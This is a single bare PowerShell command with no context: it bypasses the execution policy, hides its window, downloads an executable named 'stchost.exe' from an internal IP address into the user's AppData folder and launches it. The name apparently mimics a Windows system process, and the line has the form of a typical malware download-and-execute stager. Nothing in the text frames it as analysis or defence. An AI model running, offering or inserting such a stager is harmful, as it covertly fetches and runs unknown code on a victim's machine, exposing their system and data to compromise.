
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://10.10.01.10/bahoo/stchost.exe', $env:APPDATA\stchost.exe );Start-Process ( $env:APPDATA\stchost.exe )

